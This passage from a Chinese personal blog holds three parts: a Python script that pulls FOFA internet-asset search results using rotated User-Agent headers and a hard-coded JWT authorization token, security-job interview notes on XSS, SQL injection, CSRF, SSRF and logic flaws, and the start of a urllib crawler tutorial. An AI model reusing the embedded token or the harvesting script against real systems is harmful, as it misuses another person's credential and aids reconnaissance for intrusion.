MSIE 7.0; Windows NT 5.1; The World)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  uaa = random.choice(user_agent_list)</span><br><span class="line">  <span class="comment">#Authorization字段里面有认证信息</span></span><br><span class="line">  header = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;api.fofa.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6NzkzMTIsIm1pZCI6MTAwMDQ5Mjk1LCJ1c2VybmFtZSI6ImtyaWxsZXIiLCJleHAiOjE2MjM4ODk1ODguODg2NzU3MSwiaXNzIjoicmVmcmVzaCJ9.zhBsOIeNCWCtv7Tdr0n4m3x2HBkYrzesRB0c5ZUyk7lNgLVmEjQPL-B1QDEmASFJTop05f-Yt7WApIiz3XIa7w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  header[<span class="string">&#x27;User-Agent&#x27;</span>] = uaa</span><br><span class="line">  print(header)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">run</span>():</span></span><br><span class="line">  keyword = <span class="built_in">input</span>(<span class="string">&quot;输入搜索内容&quot;</span>)</span><br><span class="line">  print(<span class="built_in">type</span>(keyword))</span><br><span class="line">  page = <span class="built_in">input</span>(<span class="string">&quot;输入页数,最多五页，每页10个结果&quot;</span>)</span><br><span class="line">  keyword_base64 = base64.b64encode(keyword.encode())</span><br><span class="line">  url = <span class="string">&#x27;http://api.fofa.so/v1/search?&#x27;</span></span><br><span class="line">  <span class="comment"># 参数写成一个字典</span></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: keyword,</span><br><span class="line">    <span class="string">&#x27;qbase64&#x27;</span>: keyword_base64,</span><br><span class="line">    <span class="string">&#x27;full&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: page,</span><br><span class="line">    <span class="string">&#x27;ps&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  query_str = parse.urlencode(data);</span><br><span class="line"></span><br><span class="line">  url += query_str</span><br><span class="line">  print(url)</span><br><span class="line">  <span class="comment"># 发送请求</span></span><br><span class="line">  <span class="comment">#构建请求对象</span></span><br><span class="line">  request_ob = request.Request(url=url,headers=getheaders())</span><br><span class="line">  <span class="comment">#发送请求</span></span><br><span class="line">  resp = request.urlopen(request_ob)</span><br><span class="line">  print(resp.read())</span><br><span class="line">  <span class="comment"># filename = keyword + &#x27;.html&#x27;</span></span><br><span class="line">  <span class="comment"># with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span></span><br><span class="line">  <span class="comment">#   fp.write(resp.read().decode())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getheaders()</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210617023338871.png" alt="image-20210617023338871"></p>
<p>返回结果中获取了url链接，接下来要做得就是解析返回结果，提取关键信息。先睡了，明天写一下分析以及脚本完善。bb</p>
<h2 id=""><a href="#" class="headerlink" title=""></a>
        
          <p class="article-more-link">
            <a href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/" data-id="ckpztfq97000020w24ypa89qp" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-安恒面经整理" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/16/%E5%AE%89%E6%81%92%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/" class="article-date">
  <time datetime="2021-06-15T16:07:15.784Z" itemprop="datePublished">2021-06-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="安恒面经整理："><a href="#安恒面经整理：" class="headerlink" title="安恒面经整理："></a>安恒面经整理：</h3><p><strong>自我介绍：</strong>21岁，大三、哪里人，所学专业，性格活泼外向、从大二开始对安全感兴趣。</p>
<p><strong>公司做过哪些工作：</strong>略</p>
<p><strong>知道哪些漏洞：</strong> 系统漏洞（linux、windows）  web漏洞、设备、网络产品漏洞</p>
<p><strong>web漏洞有哪些：</strong> 语言漏洞（php被黑  被加后门）、web服务器漏洞（apache、nginx、jboss、apache）、cms漏洞、oa产品漏洞、开发框架漏洞、应用漏洞（web应用漏洞、服务器应用漏洞）</p>
<p><strong>系统层面漏洞有哪些：</strong>windows： SMB远程代码执行、win32k 本地提权漏洞、历史漏洞库。linux： 相对来说少一些。sudo 权限提升漏洞、内核提权漏洞等等</p>
<p><strong>xss形成原理  是否测试过xss：</strong>测过。原理是没有对用户输入做严格校验与过滤。一般推荐白名单（存在绕过可能），html实体化等等。灰盒测试挖到phpyun 两个xss。</p>
<p><strong>有参加过ctf比赛ctf负责哪些方面：</strong>没有，但是挖过src，美团高校赛</p>
<p><strong>sql注入可以达到什么效果：</strong>获取信息（爆库托库）、数据库权限、甚至系统权限   </p>
<p><strong>udf提权:</strong> 用户定义函数提权。原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39683163/article/details/113276587">https://blog.csdn.net/weixin_39683163/article/details/113276587</a></p>
<p><strong>csrf防御：</strong> 对敏感操作做二次校验，加入随机token 使得攻击者无法冒充合法用户发起恶意请求</p>
<p><strong>ssrf能达到什么效果：</strong> 内网信息收集 </p>
<p><strong>脚本能力：</strong> 信息收集的小工具，比如nmap+masscan，cms识别器、小爬虫、数据提取脚本、</p>
<p><strong>用java做过什么东西：</strong> 学生管理系统（javase）</p>
<p>中间件反序列化漏洞 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
<p>在公司发现过什么漏洞场景：购物app，需要登录，购物车里选择地址，或自己已经有的地址，渗透如何测试，</p>
<p><strong>还问逻辑漏洞还有哪些：</strong> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1763568">https://cloud.tencent.com/developer/article/1763568</a></p>
<p>授权类：</p>
<p>垂直越权：比如普通用户可以修改管理员的密码</p>
<p>水平越权：比如可以查看其他用户的订单</p>
<p>验证码：</p>
<p>未验证、复用、爆破、篡改服务端返回信息、等等</p>
<p>业务数据篡改：</p>
<p>金额、订单数量篡改</p>
<p>重放攻击：</p>
<p>用于身份认证</p>
<p>邮箱短信轰炸：</p>
<p><strong>sql注入点怎么测：</strong> 测试动态参数、判断程序执行 是成功、失败、waf拦截、forbidden、404、还是什么，进而判断出可能存在的注入点。</p>
<p><strong>用哪些工具测试：</strong> 熟悉sqlmap的使用即可</p>
<p><strong>你是从什么时候开始对安全感兴趣的   关注过安全资讯：</strong>大一，freebuf、seebug、公众号、08067、论坛、peiqiwiki、hackmoon、tg等等</p>
<p><strong>tools有账号么：</strong>有，邮件发了自己一篇漏洞挖掘的笔记，就过了。  </p>
<p><strong>有挖到过src吗：</strong>有，美团、补天 （好大夫）、公益src、教育src </p>
<p><strong>linux安全日志位置：</strong>  </p>
<p><strong>以后打算与发展:</strong> 想往内网（第一选择）或者python安全开发方向（为辅助）走。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/06/16/%E5%AE%89%E6%81%92%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/" data-id="ckpz7z8cj0000fow21juihl7g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python爬虫学习day1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/15/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0day1/" class="article-date">
  <time datetime="2021-06-15T09:56:56.249Z" itemprop="datePublished">2021-06-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/15/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0day1/">python爬虫学习day1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>记录了一下python3爬虫实现用到的一些模块，主要用了urllib包中的request、response、parse 模块。为了以后方便查找，记录一下：</p>
<p><strong>urllib的使用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @author: kriller</span></span><br><span class="line"><span class="string">  @license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.</span></span><br><span class="line"><span class="string">  @contact: kriller@cumt.edu.cn</span></span><br><span class="line"><span class="string">  @file: urllib_test.py</span></span><br><span class="line"><span class="string">  @time: 2021/6/15 11:55</span></span><br><span class="line"><span class="string">  @desc: urllib主要用到urllib.request 以及urllib.parse 其中urllib.request 中主要用到urlopen以及urlretrieve两个方法</span></span><br><span class="line"><span class="string">  下面是实例演示</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://www.baidu.com&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># response = rq.urlopen(url)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(response.read().decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="comment"># urlopen 返回的是一个对象,该对象有 read()、geturl()、getheaders()、getcode()、readlines() 方法</span></span><br><span class="line"><span class="comment"># read 方法返回的是字节对象，如果需要返回文本，需要进行decode(&#x27;对应网页编码&#x27;)</span></span><br><span class="line"><span class="comment"># print(response.geturl())</span></span><br><span class="line"><span class="comment"># print(response.getcode())</span></span><br><span class="line"><span class="comment"># print(response.getheaders())</span></span><br><span class="line"><span class="comment"># print(response.readlines())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将返回的网页文本写入文件中</span></span><br><span class="line"><span class="comment"># with open(&#x27;baidu.html&#x27;,&#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span></span><br><span class="line"><span class="comment">#     fp.write(response.read().decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一张图片：</span></span><br><span class="line"><span class="comment"># 方法1图片只能写入本地二进制</span></span><br><span class="line"><span class="comment">#imgurl = &#x27;https://raw.githubusercontent.com/John-tlh/blog/master/imagesdff0648ea3163cbe403c144932470520.jpg&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># res1 = rq.urlopen(imgurl)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># with open(&#x27;bd.jpg&#x27;,&#x27;wb&#x27;) as im:</span></span><br><span class="line"><span class="comment">#     im.write(res1.read())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2 使用request.urlretrieve</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rq.urlretrieve(imgurl,&#x27;bd_back.jpg&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#urlparse</span></span><br><span class="line"><span class="comment"># 测试urlparde中的quote方法 编解码</span></span><br><span class="line"><span class="comment"># imaurl = &#x27;https://www.baidu.com/link?url=fmp_Fb1llQ_tDkQUMFvC4nfd_KY9rJGhOQIz6erl9Fr8xkcykyKAadZ0TAVeVjRK_JKpv6-Wlg67nV7xttk65_O_g2ER--llKAeETSsS3pPNfrC9M4yfjtHfnO75cFjlHgcU3poGlbfSx5OSx3CJx7uH9zD1yiGxoviIZSgb8lQEiQP8D31MsYyk0SYyjZEFXoYtd5pXOIcUv-BE2Xv8ybbhbSyCLYU3PcukOvdj7e_eTY9RsrnW3y4NEs9rb7HcF2OEOHjpROXSOmwSGwP88xchUAdTLYVll7gibpdf7nwfdnZdVSvP1Ak9li0rUU-ywaZ5qPGLNk8dfH6sNXnJ40SFhwS2DP3p0JZ8rUHJ5qRAPXYndXzCitnf5IJ8TFq2OLPj3XM8Ik_IodFiSSTPJFmepNQVhbl4BCQoRfKmawrnidPclM5R3fOw0gOxyjGY4Ir_h0rGA5MVql8-KNKNVd-YWBpMMReXUIIuntoe-lK&amp;click_t=1623735162241&amp;s_info=1003_990&amp;wd=&amp;eqid=a71ff3180015b1860000000260c83b75&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(parse.quote(imaurl))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接多个get 参数到url中</span></span><br><span class="line"><span class="comment">#方法一:自己写</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;xxh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;height&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字典</span></span><br><span class="line"><span class="comment"># lt = []</span></span><br><span class="line"><span class="comment"># for k, v in data.items():</span></span><br><span class="line"><span class="comment">#     lt.append(k+ &#x27;=&#x27; + str(v))</span></span><br><span class="line"><span class="comment"># #print(lt) [&#x27;name=xxh&#x27;, &#x27;age=18&#x27;, &#x27;sex=男&#x27;, &#x27;height=20&#x27;]</span></span><br><span class="line"><span class="comment"># query_string = &#x27;&amp;&#x27;.join(lt)</span></span><br><span class="line"><span class="comment"># #print(query_string) name=xxh&amp;age=18&amp;sex=男&amp;height=20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#方法2: parse.urlencode(data)</span></span><br><span class="line">query_str = parse.urlencode(data)</span><br><span class="line">print(query_str)</span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com&#x27;</span>+<span class="string">&#x27;?&#x27;</span>+query_str</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#更推荐用urldecode(),会对中文进行转义</span></span><br></pre></td></tr></table></figure>

<p><strong>自定义请求头(随机UA) 发起get请求</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span 